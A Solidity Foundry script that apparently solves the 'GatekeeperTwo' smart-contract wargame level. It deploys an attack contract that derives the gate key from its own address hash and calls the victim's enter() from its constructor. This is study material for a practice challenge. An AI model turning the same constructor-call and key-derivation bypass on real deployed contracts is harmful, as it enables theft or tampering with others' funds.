// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external;
}

contract GatekeeperTwoAttack {
    constructor(IGatekeeperTwo victim) public {
        // gateThree - _gateKey must be the bitwise complement of
        // the last 8 bytes of the this contract's encoded address.
        uint64 senderCode = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        bytes8 _gateKey = bytes8(senderCode ^ type(uint64).max);

        victim.enter(_gateKey);
    }
}

contract GatekeeperTwoAttacker is Constants, Script {

    function run() public {
        IGatekeeperTwo victim = IGatekeeperTwo(GATEKEEPER_TWO_ADDRESS);
        
        vm.startBroadcast(ATTACKER_ADDRESS);
        attack(victim);
        vm.stopBroadcast();
    }
    
    // Must be external/public to be payable
    function attack(IGatekeeperTwo victim) public payable {
        new GatekeeperTwoAttack(victim);
    }
}